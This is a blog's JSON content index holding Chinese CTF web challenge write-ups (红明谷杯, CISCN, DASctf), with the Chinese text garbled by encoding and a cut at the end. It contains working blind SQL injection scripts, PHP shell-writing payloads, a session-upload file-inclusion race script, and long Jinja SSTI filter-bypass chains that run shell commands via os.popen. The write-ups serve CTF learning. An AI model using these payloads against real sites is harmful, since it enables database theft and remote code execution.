{"meta":{"title":"Ma4out7'Blog","subtitle":"","description":"","author":"Ma4out7","url":"http://example.com","root":"/"},"pages":[{"title":"[404]ï¼ˆå¼•å·å†…ä¸ºé¡µé¢æ ‡é¢˜å¯æ›´æ”¹ï¼‰","date":"2021-03-18T09:59:50.505Z","updated":"2021-03-18T09:59:31.640Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":""},{"title":"about","date":"2020-11-11T11:15:06.000Z","updated":"2021-04-09T01:20:20.679Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"kkkkkkkkkkkkkkkkkkkkk"},{"title":"categories","date":"2020-11-11T11:27:10.000Z","updated":"2020-11-11T11:27:40.034Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"links","date":"2020-11-11T11:56:04.000Z","updated":"2020-11-11T11:56:04.267Z","comments":true,"path":"links/index.html","permalink":"http://example.com/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-11T11:55:44.000Z","updated":"2020-11-11T11:55:44.471Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"çº¢æ˜è°·-web å¤ç°","slug":"CTFæ¯”èµ›/çº¢æ˜è°·æ¯","date":"2021-04-06T14:06:06.000Z","updated":"2021-05-20T00:50:39.725Z","comments":true,"path":"2021/04/06/CTFæ¯”èµ›/çº¢æ˜è°·æ¯/","link":"","permalink":"http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/","excerpt":"","text":"å‚è€ƒçº¢æ˜è°·æ¯å®˜æ–¹ wp &gt; https://blog.csdn.net/mochu7777777/article/details/115410705? çº¢æ˜è°·æ¯-web å¤ç°1.happysql è€ƒç‚¹ï¼šä½¿ç”¨äº†åŒå¼•å·é—­åˆï¼Œæ²¡æœ‰å›æ˜¾çš„å¸ƒå°”ç›²æ³¨ å¾ˆæ˜æ˜¾æ˜¯å¸ƒå°”ç›²æ³¨äº†æ¥ä¸‹æ¥è€ƒè™‘ä¸¤ä¸ªç‚¹ï¼š 1.æˆªæ–­å‡½æ•°ç”¨å“ªä¸ªï¼Ÿè¿™é‡Œ mid()å’Œ substring()å·²ç»è¢«è¿‡æ»¤äº† 2.å¦‚ä½•ç»•è¿‡ information æˆªæ–­å‡½æ•°å¯ä»¥ç”¨ left()å’Œ right()ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°å¹¶ä¸èƒ½åƒ mid å’Œ substring ä¸€æ ·é€ä¸ªæˆªæ–­ï¼Œå†™è„šæœ¬çš„æ—¶å€™æ³¨æ„ä¸‹æµ‹è¯•å­—ç¬¦ä¸²çš„æ‹¼æ¥ã€‚è€Œç»•è¿‡ information å·²ç»æ˜¯è€ç”Ÿå¸¸è°ˆäº†ï¼ŒçŒœæµ‹é€šè¿‡æŸ¥è¯¢ mysql.innodb_table_stats å¾—åˆ°åº“åå’Œè¡¨åmysql.innodb_table_stats ä½¿ç”¨ ä¸‹é¢æ˜¯æ³¨å…¥çš„è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334import requestsimport binasciiburp0_url = &quot;http://eci-2ze6hpkvyv42lzgmdxw9.cloudeci1.ichunqiu.com/login.php&quot;burp0_cookies = &#123;&quot;__jsluid_h&quot;: &quot;a1606fe5f9707bca94488c2d982b99f4&quot;, &quot;PHPSESSID&quot;: &quot;fb934e887a0284aeb6b4aae1cb206963&quot;&#125;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) G1ecko/20100101 Firefox/88.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://eci-2ze0zymtn8akiu41ofjl.cloudeci1.ichunqiu.com&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://eci-2ze0zymtn8akiu41ofjl.cloudeci1.ichunqiu.com/index.php&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;# string = &quot;1234567890abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;string = &quot;1234567890abcdef-&#123;&#125;&quot;flag = &#x27;flag&#123;9eb68b21-9235-430c-8f24-a14ce8ec&#x27;# get table# for i in range(32):# for j string:# s = flag+j# payload = &quot;\\&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x66&#123;&#125;#&quot;.format(s.encode(&#x27;hex&#x27;))# print(payload)# burp0_data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &#x27;&#x27;&#125;# res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)# if &quot;home&quot; in res.text:# flag += j# print(flag)# breakfor i in range(32): for j in string: s = flag+j payload = &quot;\\&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#123;&#125;#&quot;.format(s.encode(&#x27;hex&#x27;)) print(payload) burp0_data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &#x27;&#x27;&#125; res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) # print(res.text) if &quot;home&quot; in res.text: print(res.text) flag += j print(flag) break# print(res.text) 2.write_shell è€ƒç‚¹: ä»£ç å®¡è®¡ï¼Œç»•è¿‡ waf å†™ shell æºç å¦‚ä¸‹ è¿‡æ»¤äº† PHPï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾æ¥ç»•è¿‡;/?action=upload&amp;data=&lt;?=(p.hpinfo)()?&gt;è¿™é‡Œçš„.å¯ä»¥ç”¨æ¥è¿æ¥ phpinfo åå¼•å·æ²¡è¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥å†™å…¥å¹¶æ‰§è¡Œå‘½ä»¤ï¼Œè¯•äº†ä¸€ä¸‹åœ¨ PHP ä¸­åå¼•å·é‡Œé¢çš„å†…å®¹å¯ä»¥å½“åš shell å‘½ä»¤è¿è¡Œ 1&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09-la%09&#x2F;&#96;?&gt; ç›´æ¥è¯»å–ï¼Œæ³¨æ„è¿™é‡Œæœ‰ä¸ª php åç¼€ä¼šè¢«è¿‡æ»¤ï¼Œä¸è¿‡åœ¨å‘½ä»¤æ‰§è¡Œç§ç”¨*æ›¿æ¢å³å¯ 1&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;!whatyouwantggggggg401*&#96;?&gt; 3.easytp è€ƒå¯Ÿï¼šThinkphp POP é“¾ * 4.javaweb åé¢ä¸¤é¢˜ç­‰ä¸€ä¸‹å¤ç°ç¯å¢ƒå§ã€‚ã€‚ã€‚","categories":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"CSICN-web","slug":"CTFæ¯”èµ›/ciscn","date":"2021-04-06T14:06:06.000Z","updated":"2021-06-06T09:38:12.111Z","comments":true,"path":"2021/04/06/CTFæ¯”èµ›/ciscn/","link":"","permalink":"http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/ciscn/","excerpt":"","text":"web sql çŸ¥è¯†ç‚¹ æŠ¥é”™æ³¨å…¥ join æ— åˆ—åæ³¨å…¥ &#39;)&#39;é—­åˆï¼ŒæŠ¥é”™å¯ç”¨ï¼Œå¾—åˆ° security æ•°æ®åº“ï¼Œ æŠ¥é”™è¦å¾—åˆ°è¡¨åï¼Œinformation è¢«è¿‡æ»¤ï¼Œä»¥ä¸‹å¯ç”¨æ¥çˆ†è¡¨ 1234sys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.schema_auto_increment_columnssys.x$ps_schema_table_statistics_io ä¹Ÿå¯ 123mysql.innodb_table_stats (æ­¤è¡¨ä¸­åº“åå­—æ®µæ˜¯ database_nameï¼Œè€Œé table_schema)mysql.innodb_index_stats join æ— åˆ—åæ³¨å…¥ 123456mysql&gt; select _ from (select _ from users a join users b)c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;mysql&gt; select _ from (select _ from users a join users b using(id))c;ERROR 1060 (42S21): Duplicate column name &#39;username&#39;mysql&gt; select _ from (select _ from users a join users b using(id,username))c;ERROR 1060 (42S21): Duplicate column name &#39;password&#39; Easy_resource çŸ¥è¯†ç‚¹ vim å¤‡ä»½æ–‡ä»¶ PHP åŸç”Ÿç±»ä½¿ç”¨ï¼Œåå°„ç±»ReflectionMethod æ²¡æ‰¾åˆ°æºç ï¼Œåˆ°åæ¥æ‰çŸ¥é“.index.php.swo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113&lt;?phpclass User&#123; private static $c &#x3D; 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125;&#125;$rc&#x3D;$_GET[&quot;rc&quot;];$rb&#x3D;$_GET[&quot;rb&quot;];$ra&#x3D;$_GET[&quot;ra&quot;];$rd&#x3D;$_GET[&quot;rd&quot;];$method&#x3D; new $rc($ra, $rb);var_dump($method-&gt;$rd()); è€ƒè™‘åˆ©ç”¨åŸç”Ÿç±» ReflectionMethod è¯»å– User ç±»ä¸­çš„æ–¹æ³•ï¼›æ„å»º payloadï¼š?rc=ReflectionMethod&amp;ra=User&amp;rb=&amp;rd=getDocCommentï¼Œrb å– a-z,burpb çˆ†ç ´ middle_source çŸ¥è¯†ç‚¹ session_upload.progress æ–‡ä»¶åŒ…å«ï¼Œå‚è€ƒ æ‹¿åˆ°é¢˜ç›®æ²¡å•¥æ€è·¯ï¼Œæ‰«ä¸€ä¸‹ï¼Œæ‰«åˆ°.listingï¼Œå­˜åœ¨ phpinfo æ–‡ä»¶ ç¬¦åˆ session_upload.progress æ–‡ä»¶åŒ…å«æ¡ä»¶ï¼Œå‚è€ƒï¼šhttps://xz.aliyun.com/t/9545#toc-8ï¼Œå¾—çŸ¥session å­˜æ”¾çš„ä½ç½® var/lib/php/sessions/bcjjeaegfcexp: 123456789101112131415161718import ioimport requestsimport threadingsessid &#x3D; &#39;whoami&#39;def POST(session):f &#x3D; io.BytesIO(b&#39;a&#39; _ 1024 _ 50)session.post(&#39;http:&#x2F;&#x2F;124.70.34.66:23747&#x2F;index.php&#39;,data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?&#x3D;var_dump(scandir(&#39;&#x2F;etc&#x2F;adcfabcfeb&#x2F;hghdjaadja&#x2F;chagfbfiif&#x2F;aeaebebaje&#x2F;cabidgfcch&#x2F;fl444444g&#39;))?&gt;&quot;&#125;,files&#x3D;&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;)with requests.session() as session:while True:POST(session)print(&quot;[+] æˆåŠŸå†™å…¥ sess_whoami&quot;) ä½¿ç”¨æ ‡ç­¾ç»•è¿‡ä¸Šä¼ ä»¥åŠ var_dump+scandir å‡½æ•°æ‰“å°å‡ºç›®å½•ä¸‹æ–‡ä»¶ æµè§ˆå™¨ä¸æ–­å‘åŒ…ç›´åˆ°æ˜¾ç¤ºå‡ºç›®å½•ä¸‹æ–‡ä»¶ æ‰¾åˆ°ä¸€ä¸²éšæœºç”Ÿæˆçš„ç›®å½•ï¼Œä¸€æ­¥æ­¥æ·»åŠ ç›®å½•æ‰¾ä¸‹ä¸€çº§ç›´åˆ°æ‰¾åˆ°æœ€ç»ˆç›®å½• /etc/adcfabcfeb/hghdjaadja/chagfbfiif/aeaebebaje/cabidgfcch/fl444444gæ¢æˆåŸæ¥çš„æ™®é€šæ–‡ä»¶åŒ…å«å¾—åˆ° flag","categories":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTFæ¯”èµ›","slug":"CTFæ¯”èµ›","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"DASctf-web å¤ç°","slug":"CTFæ¯”èµ›/DASctf/DASctf","date":"2021-04-06T14:06:06.000Z","updated":"2021-05-19T12:50:45.145Z","comments":true,"path":"2021/04/06/CTFæ¯”èµ›/DASctf/DASctf/","link":"","permalink":"http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/DASctf/","excerpt":"","text":"DASctf-web å¤ç° å¤ªèœäº†å‘€ï¼Œåˆæ˜¯å‡‘æ•°çš„ä¸€å¤©å‚è€ƒhttps://shimo.im/docs/lf9OcEmdH70MC17f/read 1.BestDB8è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢+load_file æ–‡ä»¶è¯»å– ä¸Šæ¥å°±ç»™äº† SQL è¯­å¥ PHPF12 æºç æ³¨é‡Šä¸­æ˜¾ç¤º$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \\\\&quot;$query\\\\&quot;&quot;; query=1å’Œquery=2å‡æœ‰å›æ˜¾ï¼Œä½†æ˜¯å¯¹äºå•å¼•å·è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯å®ƒç»™äº† usernameï¼Œé€šè¿‡ username å‘ç°åŒå¼•å·æ˜¯æ²¡æœ‰è¢«è¿‡æ»¤çš„ï¼Œæ¥ç€æµ‹è¯•å‘ç°è¿˜è¿‡æ»¤ç©ºæ ¼ï¼Œpayload 123456789æŸ¥è¡¨lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()# æŸ¥åˆ—lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;table_schema&#x3D;database()# æŸ¥æ•°æ®lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(f1agdas),2,3&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas#å›æ˜¾äº†ä¸€ä¸ªflag.txtï¼Œåº”è¯¥æ˜¯è¦å»è¯»æ•°æ®äº†è¿™é‡Œä½¿ç”¨load_file()å‡½æ•°lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c6167)),2,3# è¿™é‡Œè¯»çš„æ–‡ä»¶æ˜¯/flagï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥æ•°æ®åº“è¦å†™ flag.txtï¼Œè¿™é‡Œå¯¹â€/â€œä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶æˆ–è€… CHAR()ç»•è¿‡ å¯æƒœäº†ï¼Œåšé¢˜æ—¶æ²¡æƒ³åˆ°é€šè¿‡ username çš„åŒå¼•å·é—­åˆæ¥æ³¨å…¥,username å˜é‡ å¤ç°ä¸­å‡ºç°çš„é—®é¢˜ä»¥ä¸Š payload å¦‚æœç›´æ¥åœ¨ hackerbar æˆ–è€… bp ä¸­ä½¿ç”¨ï¼Œä¸ä¼šè¿”å›ç»“æœï¼Œéœ€è¦ URL ç¼–ç åçš„ payload æ‰å¯ä»¥çš„å¾—åˆ°æ­£ç¡®å›æ˜¾ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒçš„åŸå› ï¼ŒæŸ¥çœ‹ flag,æ‰¾ä¸åˆ° flagâ€¦ æ˜¨å¤©æ²¡æœ‰åšå‡ºæ¥ï¼Œç°åœ¨åˆå¯ä»¥äº†query=-1%22union/**/select/**/1,load_file(0x2f666c61672e747874),3%23 2.baby_flask é»‘åå•è¿‡æ»¤ 123456789Hi young boy!&lt;/br&gt;Do you like ssti?&lt;/br&gt;blacklist&lt;/br&gt;&#x27;.&#x27;,&#x27;[&#x27;,&#x27;\\&#x27;&#x27;,&#x27;&quot;&#x27;,&#x27;&#x27;\\\\&#x27;,&#x27;+&#x27;,&#x27;:&#x27;,&#x27;_&#x27;,&lt;/br&gt;&#x27;chr&#x27;,&#x27;pop&#x27;,&#x27;class&#x27;,&#x27;base&#x27;,&#x27;mro&#x27;,&#x27;init&#x27;,&#x27;globals&#x27;,&#x27;get&#x27;,&lt;/br&gt;&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#x27;open&#x27;,&#x27;read&#x27;,&lt;/br&gt;&#x27;select&#x27;,&#x27;url_for&#x27;,&#x27;get_flashed_messages&#x27;,&#x27;config&#x27;,&#x27;request&#x27;,&lt;/br&gt;&#x27;count&#x27;,&#x27;length&#x27;,&#x27;ï¼&#x27;,&#x27;ï¼‘&#x27;,&#x27;ï¼’&#x27;,&#x27;ï¼“&#x27;,&#x27;ï¼”&#x27;,&#x27;ï¼•&#x27;,&#x27;ï¼–&#x27;,&#x27;ï¼—&#x27;,&#x27;ï¼˜&#x27;,&#x27;ï¼™&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;&lt;/br&gt;&lt;/br&gt; è€ƒç‚¹: åœ¨äºå¯¹æ•°å­—è¿‡æ»¤åï¼Œå¯¹äºä¸€äº›å…³é”®è¯çš„æ‹¼å‡‘ï¼Œä¸è¿‡è¿™é‡Œæˆ‘æ˜¯ä»¥ unicode ç¼–ç ç»•è¿‡äº†ï¼ŒçŸ¥è¯†ç‚¹ï¼špython3 æ”¯æŒ unicode ç¼–ç ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨â€ğŸ˜-ğŸ¡â€æ›¿æ¢æ•°å­—ï¼Œæµ‹è¯•çš„ä½¿ç”¨&#123;%print ğŸ¡%&#125;å¦‚æœå¯ä»¥æ­£å¸¸å›æ˜¾å°±ä»£è¡¨æ”¯æŒï¼Œ è¿‡æ»¤äº†ç‚¹å’Œä¸­æ‹¬å·è¿™æ ·çš„ï¼Œä½†æ˜¯æ²¡è¿‡æ»¤æ‰|attrï¼Œå› æ­¤æ‹¿ attr æ¥ç»•å³å¯ã€‚ç±»ä¼¼äº globals çš„ï¼Œåˆ©ç”¨ flask ä¸­çš„ join è¿‡æ»¤å™¨åŒæ ·å¯ä»¥æ‹¼æ¥å‡ºï¼š&#123;% set gl=dict(glo=a,bals=a)|join%&#125; è¿™é‡Œæ”¾å„ä½å¸ˆå‚…çš„ payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162ä¸çŸ¥åå¸ˆå‚…&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125; # pop&#123;%set b&#x3D;lipsum|string|list|attr(a)(ğŸ™ğŸ )%&#125; # _&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125; # globals&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125; # getitem&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125; # os&#123;%set f&#x3D;lipsum|string|list|attr(a)(ğŸ¡)%&#125; # ç©ºæ ¼&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%&#125; # æ–œæ &#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125; # cat &#x2F;flag&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125; # popen&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125; # read&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%&#125; #ç‚¹&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125; #ls &#x2F;var&#x2F;www&#x2F;flask&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;#æœ€åæ‹¼æ¥èµ·æ¥#&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;var&#x2F;www&#x2F;flask&#39;).read()&#125;&#125;æœ€åçš„payloadå¦‚ä¸‹ï¼ŒæˆåŠŸæ‰§è¡Œls &#x2F;var&#x2F;www&#x2F;flaskå°±å¯ä»¥çœ‹åˆ°flagäº†name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set b&#x3D;lipsum|string|list|attr(a)(ğŸ™ğŸ )%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;%set f&#x3D;lipsum|string|list|attr(a)(ğŸ¡)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%&#125;&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125;&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125;&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125;&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%&#125;&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125;&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;é›ªæ®‡å¸ˆå‚…&#123;% set dot &#x3D; g|lower|list|sort|join|trim|replace(sq,emp)|list|first %&#125;&#123;%set gar &#x3D; ()|select|string|lower|unique|list|list|join %&#125;&#123;%set lt &#x3D; gar|first %&#125;&#123;%set gw &#x3D; gar|replace(lt, emp)|first %&#125;&#123;%set e &#x3D; gar|replace(lt, emp)|replace(gw, emp)|first %&#125;&#123;%set n &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|first %&#125;&#123;%set r &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|first %&#125;&#123;%set a &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|first %&#125;&#123;%set t &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|first %&#125;&#123;%set o &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|first %&#125;&#123;%set nbsp &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|first %&#125;&#123;%set b &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|first %&#125;&#123;%set j &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|first %&#125;&#123;%set c &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|first %&#125;&#123;%set s &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|first %&#125;&#123;%set l &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|replace(s,emp)|first %&#125;&#123;%set un &#x3D; gar|replace(lt, emp)|replace(gw, emp)|replace(e, emp)|replace(n, emp)|replace(r, emp)|replace(a, emp)|replace(t, emp)|replace(o, emp)|replace(nbsp, emp)|replace(b, emp)|replace(j, emp)|replace(c,emp)|replace(s,emp)|replace(l,emp)|first %&#125;&#123;%set kw&#x3D;dict(warnings&#x3D;a)|join %&#125;&#123;%set cls&#x3D;un~un~c~l~a~s~s~un~un%&#125;&#123;%set bsx&#x3D;dict(ba&#x3D;a,se&#x3D;a)|join%&#125;&#123;%set bs&#x3D;un~un~bsx~un~un %&#125;&#123;%set ints&#x3D;dict(in&#x3D;a,t&#x3D;a)|join %&#125;&#123;%set scx&#x3D;dict(sub&#x3D;a,cla&#x3D;a,sses&#x3D;a)|join%&#125;&#123;%set sc&#x3D;un~un~scx~un~un%&#125;&#123;%set name&#x3D; un~un~dict(na&#x3D;na,me&#x3D;me)|join~un~un%&#125;&#123;%set gti &#x3D; un~un~dict(ge&#x3D;a,tite&#x3D;a,m&#x3D;a)|join~un~un%&#125;&#123;%for x in ()|attr(cls)|attr(bs)|attr(sc)()%&#125;&#123;%if kw in x|attr(name) %&#125;&#123;%set sla &#x3D; x()|attr(un~dict(module&#x3D;a)|join)|attr(un~un~dict(built&#x3D;a,ins&#x3D;b)|join~un~un)|attr(gti)((un~un~dict(imp&#x3D;a,ort&#x3D;a)|join~un~un))(dict(o&#x3D;a,s&#x3D;a)|join)|attr(dict(po&#x3D;a,pen&#x3D;a)|join)(dict(pw&#x3D;a,d&#x3D;a)|join)|attr(dict(re&#x3D;a,ad&#x3D;a)|join)()|string|list|first%&#125;&#123;%print(x()|attr(un~dict(module&#x3D;a)|join)|attr(un~un~dict(built&#x3D;a,ins&#x3D;b)|join~un~un)|attr(gti)((un~un~dict(imp&#x3D;a,ort&#x3D;a)|join~un~un))(dict(o&#x3D;a,s&#x3D;a)|join)|attr(dict(po&#x3D;a,pen&#x3D;a)|join)(dict(ls&#x3D;a)|join)~sla~dict(start&#x3D;a)|join~dot~dict(sh&#x3D;a)|join|attr(dict(re&#x3D;a,ad&#x3D;a)|join)())%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; fengå¸ˆå‚…&#123;% set id&#x3D;dict(ind&#x3D;a,ex&#x3D;a)|join%&#125;&#123;% set pp&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set ls&#x3D;dict(ls&#x3D;a)|join%&#125;&#123;% set ppe&#x3D;dict(po&#x3D;a,pen&#x3D;a)|join%&#125;&#123;% set gt&#x3D;dict(ge&#x3D;a,t&#x3D;a)|join%&#125;&#123;% set cr&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;&#123;% set nn&#x3D;dict(n&#x3D;a)|join%&#125;&#123;% set tt&#x3D;dict(t&#x3D;a)|join%&#125;&#123;% set ff&#x3D;dict(f&#x3D;a)|join%&#125;&#123;% set ooqq&#x3D;dict(o&#x3D;a,s&#x3D;a)|join %&#125;&#123;% set rd&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;&#123;% set five&#x3D;(lipsum|string|list)|attr(id)(tt) %&#125;&#123;% set three&#x3D;(lipsum|string|list)|attr(id)(nn) %&#125;&#123;% set one&#x3D;(lipsum|string|list)|attr(id)(ff) %&#125;&#123;% set 